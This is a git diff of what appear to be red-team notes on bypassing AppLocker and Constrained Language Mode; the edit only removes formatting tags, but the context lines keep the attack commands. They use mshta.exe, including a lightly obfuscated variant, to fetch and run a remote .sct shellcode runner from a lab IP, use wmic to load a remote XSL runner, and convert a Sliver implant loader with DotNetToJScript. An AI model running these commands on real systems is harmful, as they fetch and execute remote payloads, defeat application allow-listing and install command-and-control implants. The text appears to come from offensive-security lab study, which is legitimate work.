@@ -58,14 +58,12 @@ Using mshta.exe in this example to execute and download .sct shellcode runner
 
 File Reference: ToolLibrary/AppLocker-CLM/jscript.sct
 
-{% code overflow="wrap" %}
 ```bash
 # Basic Execution of jscript
 mshta.exe "javascript:GetObject('script:http://192.168.45.277/jscript.sct');close();"
 # slightly offuscated Execution of Jscript
 mshta.exe "javascript:a=GetObject;b='script:http://192.168.45.227/jscript.sct';a(b);close();"
 ```
-{% endcode %}
 
 ***
 
@@ -103,7 +101,6 @@ Sliver (dll) runner: ToolLibrary/Compiled/Sliver/SliverLoader-\<arch>.dll\
 Payload Generator: \[DevBox] C:\Tools\DotNetToJScript\DotNet2JScript \
 Sliver (jscript) runner: ToolLibrary/Compiled/Sliver/Sliver-\<arch>.js
 
-{% code overflow="wrap" %}
 ```bash
 # utility location
 C:\Windows\System32\wbem\wmic.exe
@@ -115,4 +112,3 @@ wmic process get /format:"http://192.168.45.227/runner.xsl"
 C:\Tools\DotNetToJScript>DotNetToJScript.exe SliverLoader-<arch>.dll --lang=Jscript --ver=v4 -o runner.js
 # Copy contents of runner.js and place into runner.xsl line 10
 ```
-{% endcode %}
